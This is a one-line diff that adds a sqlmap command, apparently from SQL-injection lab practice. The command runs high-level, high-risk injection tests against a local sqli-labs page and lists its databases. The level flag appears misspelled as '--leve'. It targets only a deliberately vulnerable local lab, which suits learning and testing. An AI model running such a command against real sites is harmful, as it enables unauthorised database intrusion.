@@ -1,0 +1,1 @@
+python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-1/?id=1" --leve=5 --risk=3 --dbs
